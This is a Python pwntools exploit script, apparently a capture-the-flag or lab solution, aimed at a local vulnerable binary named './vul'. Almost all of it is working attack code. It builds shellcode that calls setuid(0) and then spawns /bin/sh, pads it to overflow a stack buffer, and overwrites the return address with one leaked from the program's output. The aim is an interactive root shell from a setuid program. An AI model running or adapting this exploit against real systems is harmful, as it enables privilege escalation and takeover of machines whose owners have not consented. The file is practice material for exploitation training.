#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This template is created using pwntools using following command
# template --quiet ./vul > exp.py

from pwn import *
context.log_level = "error"
exe = context.binary = ELF(args.EXE or './vul')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

# To get a root shell even in setuid binary whose owner is root, first we have to call setuid(0) syscall before poping up shell

shellcode = asm(shellcraft.setuid(0))
shellcode += asm(shellcraft.sh())

shellcode1 = asm('''
                xor eax, eax
                mov al, 105
                xor edi, edi
                syscall
                 
                xor eax, eax
                mov al, 59
                lea rdi, [rip+binsh]
                xor esi, esi
                xor edx, edx
                syscall
                
                binsh:
                 .string "/bin/sh"
                 ''')


io = start()
ret_addr = io.recvline().strip().split(b'at')[1].strip()
ret_addr = int(ret_addr, 16)

payload = shellcode
payload += b'A' * (0x108-len(shellcode))
payload += pack(ret_addr)

io.sendline(payload)

io.interactive()

